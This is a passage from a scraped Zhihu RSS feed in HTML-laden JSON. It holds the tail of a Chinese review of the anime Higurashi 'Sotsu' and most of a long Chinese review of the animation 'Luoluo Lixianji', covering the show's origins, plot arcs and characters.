src=\"https://pic2.zhimg.com/v2-5c9f630dec0dd85b231222040721a488_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"watermark\" data-original-src=\"v2-5c9f630dec0dd85b231222040721a488\" data-watermark-src=\"v2-a7779161a14349a9a8925ddc8fe490c7\" data-private-watermark-src=\"v2-b35f55b4132c5374e47d5a4d82f7f44f\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-d1821941d69b0bcf07a00138d09fe8e0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"watermark\" data-original-src=\"v2-d1821941d69b0bcf07a00138d09fe8e0\" data-watermark-src=\"v2-a656b6dddb14ab8c6093b7e1e0884590\" data-private-watermark-src=\"v2-88b3d5d730b76a6115b286eef3db91a1\"></p>\n<p><br></p>\n<p>• 梨花被打脸合集：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-ac047fd27ba348a349f7b65a93875a13_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"watermark\" data-original-src=\"v2-ac047fd27ba348a349f7b65a93875a13\" data-watermark-src=\"v2-06aefcb0a2356be82919099857216601\" data-private-watermark-src=\"v2-8ff8e57facab1a4f7d12fc09f17963e6\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-7b724c5925a558e0920221a6d54a1f9f_720w.jpg?rss\" data-caption=\"严格来说也没错，圭一确实靠闹钟打赢了菜刀，一战（再度）成名\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"watermark\" data-original-src=\"v2-7b724c5925a558e0920221a6d54a1f9f\" data-watermark-src=\"v2-606ee783a3b4d9cb5225e7d803f55075\" data-private-watermark-src=\"v2-228f9b162563fccbc677f11a041dca3c\"></p>\n<p><br></p>\n<p>• 梨花和沙都子还真就是先后自杀：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-59c3928e9554b056673b3a7622ca7e03_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"watermark\" data-original-src=\"v2-59c3928e9554b056673b3a7622ca7e03\" data-watermark-src=\"v2-d0077419112df79495aabee48cf0b49d\" data-private-watermark-src=\"v2-271036a6ddcaaa571ada13d5a7efc297\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-ae02b41d08370377b0ba97917acf57ae_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"watermark\" data-original-src=\"v2-ae02b41d08370377b0ba97917acf57ae\" data-watermark-src=\"v2-552356d822ef31261ae39c97882ecd3c\" data-private-watermark-src=\"v2-e6a23075a34fcc695c367bf130a43f30\"></p>\n<p><br></p>\n<p>• 制作组好像真的很喜欢沙都子，从业到现在涉及到沙都子的画面基本上都没啥大的崩坏，甚至可以说是精致：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-a8adb805335efbef4f3a6b5fe5363a8c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"watermark\" data-original-src=\"v2-a8adb805335efbef4f3a6b5fe5363a8c\" data-watermark-src=\"v2-2e6308f51c0cde1a61b3a22e3cf97ec0\" data-private-watermark-src=\"v2-ab36b4129a757259676ca678db3f8f79\"></p>\n<p><br></p>\n<p>• 鬼明篇最后一集暴露出了《卒》的一个重大问题，那就是对于「解答方式」的不当处理。在猫骗篇和乡坏篇的铺垫之上，《业》前三篇的许多谜题其实已经不需要像鬼明篇这样按部就班地进行解读了，有寒蝉原作基础的观众靠自己的推理可以厘清大部分的谜题。或者说，这种仿佛游戏第二周目一样调换视角、补充隐藏要素的解答方式，必然会出现大量的复述性和回顾性内容，而这对观众的观看体验来说，很难起到正面作用，甚至会令人觉得这是在有意凑篇幅和水剧情。实际上谜题复杂程度更高的寒蝉本篇，当初在写解答篇的时候也是用了完全不同的故事来间接解答前篇的谜题，可见鬼明篇这样的解答篇是不合格的，也可以说是脚本家偷懒的结果。</p>\n<p>• 如果之后的两个解答篇都和鬼明篇思路一致的话，那么留给《卒》的最后一个篇章的压力是非常巨大的，毕竟前三篇都只是用来撑长度和复盘剧情的，那么终章需要有足够多的爆点和足够强大的反转才能令读者满意，但龙七一向不善于填坑，那么关于《卒》整体风评的预期，大概不会很乐观...</p>\n<p>• 不论如何，还是很期待《绵明篇》，希望在《业》中没什么戏份的诗音可以有高光表现。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-625d165409c73368f1ca55ad4a1f48bf_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"840\" data-rawheight=\"392\" data-watermark=\"watermark\" data-original-src=\"v2-625d165409c73368f1ca55ad4a1f48bf\" data-watermark-src=\"v2-5d6e9e7bdefe13c5bcedb815672d9f0a\" data-private-watermark-src=\"v2-ba7e016c31ff18ad5b56fda7d3de0a87\" data-tags=\"politic\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/gris-griffith?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">岸边的塞涅卡</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/469405052/answer/1974393667?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">8 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/322053588?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">看完并喜欢动画《寒蝉鸣泣之时》系列，可能会是怎样的人？</a><br><a href=\"http://www.zhihu.com/question/423143915?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价2020年10月开播的动画《寒蝉鸣泣之时》？</a><br>\n","link":"http://www.zhihu.com/question/469405052/answer/1974393667?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价洛洛历险记？","date":"2021-07-05 03:00:11","description":"\n<blockquote>其实，人生就是一场游戏，游戏就是一场人生。只不过这场游戏你想玩也得玩，不想玩也得玩。</blockquote>\n<p>《洛洛历险记》是蓝弧巅峰期的开始，亦是其巅峰期的结束。</p>\n<h3>背景</h3>\n<p>蓝弧动画的前身是蓝弧信息科技有限公司，创建日期为2003年，其法人为王巍，亦是导演多部蓝弧作品之人。</p>\n<p>03-07年，亦曾制作多过部动画，但是市场并无太大反响。</p>\n<p>而为他人打工而制作的《猪猪侠》则是却意外地火了。</p>\n<p>猪猪侠前四部，是猪猪侠其口碑最好之时，亦是蓝弧所制作。不过09年之后便不再参与制作，其导演以及编剧不再是王巍，现如今版权归属于广东咏声动漫股份有限公司。</p>\n<p>在此之后，猪猪侠剧情便越来越差，其IP价值也远不如以前。</p>\n<p>07-09年，蓝弧相继推出了《果冻宝贝》以及《果冻三剑客》，这两部动画可以说是《果宝特攻》的前传，但又不全是，因为很多概念都发生改变。这两部动画获得一定反响，或是星杰相中其实力，而前来与蓝弧合作。</p>\n<p>《洛洛历险记》里面的机车族，与变形金刚系列的汽车人有些相似，尤其是其变身方式。也是因此，有人称其为中国版的变形金刚。不过，也有人称《洛洛》抄袭《变形金刚》。</p>\n<p>不是，我在这里说一句。</p>\n<p>《洛洛历险记》与其相似是有缘故的，其IP来源有些许复杂，有点长。那就从其源头开始讲吧。</p>\n<p>美国有一个Tonka公司，在1982年生产了一个名为Go-Bots的机器人玩具，1983年改名为“百变雄师”，销量很高，买得比孩子宝还要好。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-46e709c1a73cb1268ea162d4a92bf0fa_720w.jpg?rss\" data-rawwidth=\"1080\" data-rawheight=\"1468\" data-size=\"normal\" data-caption=\"看图便可知此物与变形金刚的差距\" data-watermark=\"original\" data-original-src=\"v2-46e709c1a73cb1268ea162d4a92bf0fa\" data-watermark-src=\"v2-4c170278910b67d2a97870da2157fcd4\" data-private-watermark-src=\"v2-60921c269f5968f511766e453ce74f79\"></p>\n<p>不过等到孩之宝创造了变形金刚系列之后，其形势便逆转了。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-c1847547d4908aed919a046939b20800_720w.jpg?rss\" data-rawwidth=\"420\" data-rawheight=\"597\" data-size=\"normal\" data-caption=\"差距一眼便得知\" data-watermark=\"original\" data-original-src=\"v2-c1847547d4908aed919a046939b20800\" data-watermark-src=\"v2-ba49232f509ab43e14aeb9df6bdf81cd\" data-private-watermark-src=\"v2-33d34ca63129dd5e93e47d67ece2b606\"></p>\n<p>此后，在1991年Tonka以及其《百变雄师》的版权被孩之宝收购。为了做出差异化处理，让其向子供向发展。</p>\n<p>待到榨干最后一滴价值时，便废置了它。</p>\n<p>而中国的星杰相中了它，便买下来并更名为“百变机兽”。</p>\n<blockquote>广州市星杰玩具有限公司成立于2003年，是一家集动漫产业的研发与生产，拍摄与制作，发行与销售，包装与配送于一体的综合性专业文化企业。<br>     一直以来，公司致力于右脑项目的开发，创作性思维为主的变形玩具的研制，先后推出十多个变形系列，上百余款变形产品，缔造了变形玩具销售奇迹，蜚声业界。<br>     公司拥有国内顶尖的创作、编剧、导演、摄像等核心制作团队，潜心原创动漫的创作。2008年斥巨资拍摄全球第一部注入中国武侠元素的52集全三维动画《百变机兽之洛洛历险记》，在全国省市电视台掀起了热播的狂潮，同名系列玩具“百变机兽”，瞬间风靡各地，并成为变形玩具的经典。<sup data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"1\" data-text=\"\" data-url=\"http://starjet.b.ctoy.com.cn/\">[1]</sup>\n</blockquote>\n<p>上面是官网的介绍，不过就洛洛历险记的成片而言，并未展现其巨资，也许是蓝弧第一次做这种（战斗）作品，动作戏方面稍显拙劣。</p>\n<p>并且于2008年投资蓝弧，定好玩具的形象与名字，其它方面均由蓝弧负责。</p>\n<blockquote>于是星杰又找到蓝弧动画，由星杰提供玩具形象，蓝弧来改编动画，相当于动画是蓝弧原创的，只是人物名和造型是星杰早就定好的，这些造型来源就是原先孩之宝的百变雄师系列，然后经过改动而成的星杰百变机兽系列玩具。所以这里面的关系也就清晰了吧<sup data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"2\" data-text=\"\" data-url=\"https://tieba.baidu.com/p/6176518550?red_tag=2325471446\">[2]</sup>\n</blockquote>\n<p>其动画名正是《百变机兽之洛洛历险记》。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-84d8aaf1fff0ffc8e3d32eea48a466aa_720w.jpg?rss\" data-rawwidth=\"752\" data-rawheight=\"560\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-84d8aaf1fff0ffc8e3d32eea48a466aa\" data-watermark-src=\"v2-f7a8d33f5424106779ad1c7408dbef02\" data-private-watermark-src=\"v2-3ffd9726067d66818a2b80b69d55bdda\"></p>\n<p>星杰要卖玩具，蓝弧需要钱做动画来展现自己的实力，二者一拍即合。</p>\n<p>就当时结果而言，这是一个双赢的局面。</p>\n<p>《洛洛历险记》大火，其玩具销量亦非常好。蓝弧也因这部动画名声大躁，也走向了巅峰期。</p>\n<p>不过，亦在此埋下一隐患，先按下不表。</p>\n<h3>原版</h3>\n<p>《洛洛历险记》是一部由蓝弧制作，集数为52集的3D动画。</p>\n<p>开头，洛洛在暴风雨天气下，仍在玩一个游戏。此游戏其名为《机战王》，此游戏为PvP游戏，里面有机车族与猛兽族方阵营。玩家必须选择一方阵营，然后与另一方阵营进行对战。</p>\n<p>洛洛在这游戏比赛中获得亚军。</p>\n<p>洛洛自然是机车族一方，此时正处于关键时刻，即使是其母亲让其不准打游戏，等她走后仍偷偷打开游戏机。之后便来到了经典桥段，异世界穿越。</p>\n<p>这个与《数码宝贝》的穿越方式类似，天上掉下几束光，便选中了几个主角。而《洛洛》这边自然也很朴素。仅仅只是一个雷电打下来，便穿越过去。</p>\n<p>之后，便开始了异世界之旅。</p>\n<p><b>情节优秀</b></p>\n<p>蓝弧在此处给洛洛安排的是标准的成长型主角剧本。即从零开始，自己与机车族一步步成长，最后与猛兽族能分庭抗礼。</p>\n<p>而此背景是一个机车族与猛兽族相互打仗的世界，机车族四分五裂，是一盘散沙。猛兽族虽然更甚，经常会互相暗算对方，但是有一点很重要，就是比机车族强，无论是其单兵实力，亦或者是其军队实力，都远比机车族强。</p>\n<p>不过机车族比猛兽族强的地方在于，机车族会有混合技，并且是刚刚好克制猛兽族一方的技能。</p>\n<p>并且，开挂相对而言并无多少，更多是智取，而非力敌。</p>\n<p>作为其面向对象（中小学生）而言，此剧本可称之为优秀，即便是成年后回头再看，同样可以顺畅地看下去，人物智商在线，并无太多降智与令人尴尬的情节。</p>\n<p>情节有转折，主线又异常清晰，地图亦更换得恰到好处，遇到之人亦随着人物实力增长而增长，始终处了一个水平当中。</p>\n<p>《洛洛》如若按照其地图划分，可分为时光之城篇、能源之城篇、风雪之城篇、最终决战篇。</p>\n<p>时光之城篇是洛洛进入游戏世界的第一个篇章，也是熟悉这个世界的第一个篇章，所以其对手并没有过强，只是狂野星手下的第一大将——金铁兽。不过为了给其相对应的实力，洛洛遇到的第一个机车族——霹雳火，亦是处于最弱状态，连其技能雷庭半月斩也使不出来。</p>\n<p>第一个篇章，是为了介绍其人物，以及世界观，更重要的是为下一篇章做辅垫。</p>\n<p>相对应的成长实力，洛洛遇到了历史最弱时期的霹雳火。霹雳火，据我所知，其名字出自于《水浒传》中秦明的外号。秦明以脾气暴躁而著称，而霹雳火则是典型的老好人。</p>\n<p>在第一次出场时，即使是敌人，也会劝其不必白白送死。</p>\n<p>于是便从零开始，一点点升级其实力，最后还是有惊无险地击退了金铁兽大军，并与力霸天、霹雳火以及风火轮一同前往能源之城。</p>\n<p>然后便开启了整部作品最优秀的篇章——能源之城篇章。</p>\n<p>这个篇章从第10集《见义勇为》到第35集《龙虎斗》，横跨25集，几乎所有人物悉数登场，能源之城，你方唱罢我方再登场。</p>\n<p>首先，开篇即进入高潮，猛虎王与狂野猩皆想夺取能源之城的能源紫水晶。二者为了争取攻打权，在能源之城外选择一处地方开战。</p>\n<p>猛虎王速度很快，但是很难破狂野猩的防，而狂野猩攻击力强，而速度则慢上许多，无法进猛虎王其身。</p>\n<p>二者各有强项，自身弱点皆是对方强项。这本应该是一场无法分出胜负的一场战斗，不过猛虎王选择用计谋，选用围殴战术，将狂野猩围殴致残。</p>\n<p>关键时刻金铁兽赶到，不过仍不是猛虎王对手，而关键时刻，机车族这边龙卷风、霹雳火和力霸王选择出手相救。这是一个弱肉强食的世界，即强者才能生存。可是除了弱肉强食，还有一群坚守原则的（机器）人。龙卷风讨厌人多欺少，猛虎王则一直喜欢以多欺少，二者正是水火不容的关系。而其霹雳火与力霸天则是极为看重义气，光明磊落之人自是见不惯诡计多端之人。</p>\n<p>人与人的感情，亦会影响其结果，后来洛洛的对手晶晶亦是如此。晶晶使用计谋将三个猛兽王移位，虽然狂野猩和猛虎王都将其对手逼入绝境。不过晶晶却忘了，就算棋子，也是会有个人情感的，棋子不应该不是毫无情感的，也要考虑棋子本身的情感方可成事。</p>\n<p>于是三者皆以不同原因而出手相救，最后都掉到熔浆下。不得不说，这个熔浆的设计是真的不错，熔浆则只是幻象，实则只是障眼法。所有的人都会惧怕掉入熔浆，而能源紫水晶刚好在其熔浆下面。</p>\n<p>最后，猛虎王以金铁兽为人质，换来狂野猩的退走，自此，能源之城的攻防战开始。</p>\n<p>能源之城的人物众多，自本身也是一个易守难攻的城池。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-7adcabb92eaaca2599fbc288f8f18169_720w.jpg?rss\" data-rawwidth=\"1435\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"并且能源之城有空军优势\" data-watermark=\"original\" data-original-src=\"v2-7adcabb92eaaca2599fbc288f8f18169\" data-watermark-src=\"v2-25d257efe9031d9ced4bd9baba215d84\" data-private-watermark-src=\"v2-def0fa32c374556b35aa6bc45115c6d4\"></p>\n<p>正面强攻自然不行，于是猛虎王选择诱敌出来，通过歼灭其有生力量。再夺取城池。</p>\n<p>因为城主很谨慎，主动出击会导致一波被翻盘，所以即使是多次失败也不会导致人员损失惨重。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-3d3d3b6a48d97c626a0aba34551a6cce_720w.jpg?rss\" data-rawwidth=\"822\" data-rawheight=\"621\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-3d3d3b6a48d97c626a0aba34551a6cce\" data-watermark-src=\"v2-24868463521e1c791e687c9a2633572b\" data-private-watermark-src=\"v2-2213119af61c3cbe2effe5e917d9715d\"></p>\n<p>猛虎王的强大，这是众所周知的事实，而为了让机车族拥有打败其能力的信心，猛虎王通过一次次攻城挑战来麻痹众人，一次次地败退，让他们产生可以战胜猛虎王的想法，助长其骄兵气息。最后能源之城选择出击，却以惨败回归。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-91122350f0efcb3576013f0012d0f22f_720w.jpg?rss\" data-rawwidth=\"823\" data-rawheight=\"613\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-91122350f0efcb3576013f0012d0f22f\" data-watermark-src=\"v2-7f3d75f51665cf55ef750929ccd9cd55\" data-private-watermark-src=\"v2-97fe686ab9b3e72f6b6d9a592a0d8c04\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-ed0b9457227bda2e6f2a764698f867ef_720w.jpg?rss\" data-rawwidth=\"824\" data-rawheight=\"608\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-ed0b9457227bda2e6f2a764698f867ef\" data-watermark-src=\"v2-2f9d79a931e6af12aa6239259f0a0760\" data-private-watermark-src=\"v2-4138b79cc068b39a2d000f0e02ef1c58\"></p>\n<p>待攻占能源之城后，这也仅仅只是个开始。</p>\n<p>洛洛、闪电（城主）、霹雳火以及急先锋掉入火龙山谷，在此练习流影电光闪。</p>\n<p>而风火轮、龙卷风和力霸天则前往圣骑森林，一是为力霸天接回其断臂，二是寻找冲击波。</p>\n<p>之后狂野猩出来攻打猛虎王，金铁兽牺牲来救狂野猩。</p>\n<p>蓝毒兽背叛猛虎王，暴龙神来摘取胜利的果实，闪电战死，力霸天出手营救猛虎王，最后猛虎王掉下火龙山谷为这一篇章画上句号。</p>\n<p><br></p>\n<p>除此外，我对这个篇章映像深刻的一点就是，当初我家里有碟片机，当初看这部动画的方式是用光盘来看。而那时家里的电视机有一个臭毛病。</p>\n<p>即DVD播放到一定时间段时，就会蓝屏，即再也观看不下去。我也不知道这是何毛病。而恰好，每次看到能源之城攻防战的时候，就卡在那里。</p>\n<p>之后的剧情就再也看不到了，所以我一直很发疯，明明后续就在眼前，却无法观看，想起来就难受。</p>\n<p><b>最终战</b></p>\n<p>除了能源之城篇，最终战篇我也觉得可以具体展开讲讲。</p>\n<p>战前，机车族练成了合击了绝技，准备将猛兽族分而击之。</p>\n<p>不过，在后半段方才出现的猛兽族机战王晶晶改变了这一切，让本来可以较为顺利进行的计划蒙上一层阴影。</p>\n<p>暴龙神先来到狂野之城，明面上围魏救赵，实则是狂野猩调到亡灵之都。而猛虎王则选择放弃攻打雷霆殿，回到狂野之城，然后暴龙神再前往雷霆殿。至此，克制关系已经完全反了过来。</p>\n<p>按照其计划，猛兽族可以一举赢下机车族。</p>\n<p>不过，晶晶算漏了三点，</p>\n<p>第一点是忽视棋子自身情感，这一点在前文提到过，在此不再赘述。</p>\n<p>第二点就是蓝毒兽的存在，蓝毒兽拥有雷霆殿令牌，并将计划泄露给风火轮，最后让洛洛从亡灵之都逃出来，最后才得以让霹雳火与急先锋活下来。</p>\n<p>第三点则是留给霹雳火和急先锋的挂，月色。</p>\n<p>第一点导致前往狂野之城与亡灵之都的机车族没有死，全部聚集在雷霆殿当中。</p>\n<p>第二点导致整个计划被打乱。</p>\n<p>第三点则是导致没有霹雳火与急先锋没有被暴龙神杀死。</p>\n<p>机车族和猛兽族几乎全员到场，并且已经开战。</p>\n<p>二者也进入一个随时有可能你死我活的状态。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-04376315a18133734f286bc1d098124a_720w.jpg?rss\" data-rawwidth=\"1435\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-04376315a18133734f286bc1d098124a\" data-watermark-src=\"v2-29d27001bdad5b8cd728f12e23e1cb54\" data-private-watermark-src=\"v2-98f107dd167eed75a0cd870fab7d3c3c\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-be2264957612adb83afaccad62e76617_720w.jpg?rss\" data-rawwidth=\"751\" data-rawheight=\"570\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-be2264957612adb83afaccad62e76617\" data-watermark-src=\"v2-81700ed9396c8ffa94c86268a81443fe\" data-private-watermark-src=\"v2-bd87a70d47667a141a3b14012d83b857\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-e5661a52df66910b65921410d74ab897_720w.jpg?rss\" data-rawwidth=\"744\" data-rawheight=\"571\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-e5661a52df66910b65921410d74ab897\" data-watermark-src=\"v2-0db1fdf341750e755ec17ed2b4958d70\" data-private-watermark-src=\"v2-b826d58768d8a63caa434060c571c779\"></p>\n<p>最后以一种较为巧妙的方式解决了整个矛盾，即谈一谈。</p>\n<p>谈一谈，有时候真的可以解决问题。</p>\n<p>洛洛和晶晶都想回家，都需要对方的令牌，于是二者便选择合作，这样都可以一起回家了。</p>\n<p>这样机战王即不存在根本矛盾了，所以二者可以和平解决。</p>\n<p>可是，并未解决机车族和猛兽族的矛盾。</p>\n<p><br></p>\n<p>一个标准的王道少年动画剧本。</p>\n<p>情节能做到曲折而易懂，人物没有降智，亦未感受到相应降智，人物各种背叛与情感，以及即使是反派角色，亦有情有义。这种剧情，国内与之相似的有同样是国产动画的经典之作《虹猫蓝兔七侠传》。</p>\n<p><b>人物饱满</b></p>\n<p>《洛洛历险记》让人最为称道的是角色刻画，除了主角方机车族的刻画，反派方面的刻画亦不曾减少。</p>\n<p>无论是机车族，又或者是猛兽族，还是机战王，他们都会成长，都会改变。</p>\n<p><b>猛虎王</b>，他有一句经典的话，“<b>战争是一场肮脏的游戏，而我是一个肮脏的玩家</b>”。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-e84dce5c6c74be0037605180602f44d2_720w.jpg?rss\" data-rawwidth=\"755\" data-rawheight=\"562\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-e84dce5c6c74be0037605180602f44d2\" data-watermark-src=\"v2-b2c644223a313dbcdc420defdf0d36f6\" data-private-watermark-src=\"v2-3727b1565dc2ec272d0c33e53b325a69\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-e661a45668e9ad49cdba5bc2c4a2dd4e_720w.jpg?rss\" data-rawwidth=\"670\" data-rawheight=\"507\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-e661a45668e9ad49cdba5bc2c4a2dd4e\" data-watermark-src=\"v2-d33d16e98e8986957dd7071b0008a88a\" data-private-watermark-src=\"v2-d022a9af5b9e17e82bc23084c8718247\"></p>\n<p>猛虎王诡计多端，利用一切可以利用。以前他和狂野猩是朋友，后来为了利益可以三番五次算计狂野猩。他又极度讨厌叛徒，银铁兽背叛了狂野猩却被他转手杀死。</p>\n<p>不过当他开始频繁利用别人时，也许没有想到有面终有一天，自己也会被蓝毒兽背叛，亦绝不会想到，出来救他的是一自己暗算过多次的对手——力霸天。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-64384cf0c4b7cdc764a4186096dbbc5a_720w.jpg?rss\" data-rawwidth=\"754\" data-rawheight=\"554\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-64384cf0c4b7cdc764a4186096dbbc5a\" data-watermark-src=\"v2-a5f773e1eba5edee0f1d6d6ae24dfc4b\" data-private-watermark-src=\"v2-92cf2f0ef6097e71b4460dc8a2dd9b34\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-dd3aa325559dc39ebc9a816946913229_720w.jpg?rss\" data-rawwidth=\"743\" data-rawheight=\"562\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-dd3aa325559dc39ebc9a816946913229\" data-watermark-src=\"v2-083ca464b93e206e5f13ac6627cee8a3\" data-private-watermark-src=\"v2-260815ac4267ad72ed8d1bb24253dec5\"></p>\n<p>同样，猛虎王也想不到，当他向狂野猩借兵时，这个曾被他杀死过手下第一大将、多次暗算过狂野猩，可以借给他黑铁兽大军。并且狂野猩也没有要猛虎王的后备隐藏能源。</p>\n<p>猛虎王一直以来秉持想法，被现实一点点改变。</p>\n<p>所以他后来说出了“最珍贵的是朋友”这句话。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-80c0fe0865b1a63f2949ab649f1c2675_720w.jpg?rss\" data-rawwidth=\"749\" data-rawheight=\"567\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-80c0fe0865b1a63f2949ab649f1c2675\" data-watermark-src=\"v2-17204e7b2da13e499d5cf4ede725503b\" data-private-watermark-src=\"v2-e0071396e5c87216e730461892a9b6e9\"></p>\n<p>也是如此，最后才会放过力霸天和冲击波。</p>\n<p><br></p>\n<p><b>狂野猩</b>，一个迷信自己拳头的傻大个，以为自己在失去金铁兽后，便不再迷信自己的力量。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7791a008833b5525d7c5b1f9ec5d1a79_720w.jpg?rss\" data-rawwidth=\"749\" data-rawheight=\"785\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-7791a008833b5525d7c5b1f9ec5d1a79\" data-watermark-src=\"v2-3edad96cbecf43d95e67f03255bbf5c8\" data-private-watermark-src=\"v2-69eebe8e216089374e741d3f01354999\"></p>\n<p>说起狂野猩，就不得不起金铁兽，金铁兽是在观众中人气很高，有勇有谋，忠心耿耿，多次救主，最后为了救出狂野猩，使用其后备隐藏能源，战死于沙场。</p>\n<p>金铁兽遇到了其伯乐，为狂野猩战死沙场也许是其最好的归宿。</p>\n<p>正所谓，士为知之者死。</p>\n<p><br></p>\n<p><b>暴龙神</b>，出场较晚，刻画亦比较少，一个典型的阴谋家，最后在能源之城篇后坐收渔人之利。可惜很快就被新猛兽族的机战王所控制，其个人想法并无太大展现，导致其并无太多刻画，可以说是挺可惜的。</p>\n<p><br></p>\n<p><b>霹雳火&amp;急先锋</b></p>\n<p>霹雳火，怜悯心太重，是其师父对霹雳火的评价。我认为他有一种精神，其名为博爱。在这个弱肉强食的世界里，尤为难得。</p>\n<p>强者才能生存的世界，还有情感存在。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-fd2e9633eb52b614382366e06541de99_720w.jpg?rss\" data-rawwidth=\"746\" data-rawheight=\"901\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-fd2e9633eb52b614382366e06541de99\" data-watermark-src=\"v2-aacf10cd730c6a6491e1ea16b7934393\" data-private-watermark-src=\"v2-19411593ce7f11588aaebf617c8f95f6\"></p>\n<p><br></p>\n<p>在后期，所有以强者为尊的角色，都或多或少因为情感而改变了观念，猛虎王、急先锋、龙卷风、狂野猩等等。</p>\n<p>除此之外，霹雳火还是洛洛的引路人。洛洛是游戏高手，却也无法理解这些事，毕竟也只是小毛孩。一切以自身利益至上的洛洛，也被霹雳火逐渐改变了其观念。</p>\n<p>全剧中，最少改变的就是他了。</p>\n<p>急先锋，名如其人，技能也亦如其人。一切都很急，亦很自大。</p>\n<p>然后被更强大的猛虎王所教育，便一蹶不振，其师父因此而死，月神殿亦因此而毁灭。</p>\n<p>之后，其心态亦改变很多，待到机战王洛洛来到后，方才重新找回其信念。</p>\n<p>一急一缓，组成一对，方能使其合击绝技“流影电光闪”。</p>\n<p><b>力霸天&amp;冲击波</b></p>\n<p>力霸天是典型的力量型选手，其性格亦是如此——稳重。</p>\n<p>本来是与世无争的一个推土机，但是其弟弟被蓝豹兽所杀之后，方才选择与霹雳火等人联手。</p>\n<p>路见不平，亦会拔刀相助，尊重一个战士，战士可以战死，但绝不能侮辱至死。</p>\n<p>冲击波，也是类似，只不过领地意识相对更强些见不贯欺负弱小之辈。</p>\n<p><b>龙卷风&amp;超音速</b></p>\n<p>龙卷风，据我观察，这是人气最高的机器人。</p>\n<p>首先是有个性。</p>\n<p>其次是帅，直升机与其它机器人相比，无论是其直升机形态还是其人形态，都是最好看的。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-9286a1dd7533faa0aa7e7997dc14f04d_720w.jpg?rss\" data-rawwidth=\"1432\" data-rawheight=\"1079\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-9286a1dd7533faa0aa7e7997dc14f04d\" data-watermark-src=\"v2-86cbe6eb986cc0b236ce95eec6b3fc44\" 